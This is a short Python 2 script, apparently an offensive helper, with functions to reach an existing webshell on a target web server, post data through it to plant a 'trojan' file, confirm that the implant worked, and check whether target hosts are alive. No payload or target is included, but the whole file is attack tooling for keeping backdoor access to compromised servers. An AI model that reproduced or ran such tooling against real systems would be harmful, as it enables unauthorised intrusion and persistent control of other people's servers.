import requests

def implant(address,webshell,trojan,data):
	try:
		r = requests.get(address+webshell)
		print address,"Webshell Works Well."
	except:
		print address,"Webshell Failed"
	try:	
		r = requests.post(address+webshell,data=data,timeout=1)
		if r.status_code == 200:
			r = requests.get(address+trojan)
			if r.status_code == 200:
				print "Implant Succeed."
				print "*******************************************************"
	except:
		r = requests.get(address+trojan)
		if r.status_code == 200:
			print "Implant Succeed."
			print "Trojan Content:",r.text
			print "*******************************************************" 
		else:
			print "Implant Failed."
			print "*******************************************************" 
		
def connect(address,data):
	try:
		r = requests.get(address,data=data)
		print "Succeed."
		print "Status_code:",r.status_code
		print "Content:",r.text
		print "*******************************************************" 
	except:
		print "Failed."
		print "*******************************************************"

def check(address):
	try:
		r =requests.get(address)
		if r.status_code == 200 :
			print address,"Living."
			print "*******************************************************" 
			return 1
		else:
			print address,"Dead."
			print "*******************************************************"
			return 0
	except:
		print address,"Dead."
		print "*******************************************************"
		return 0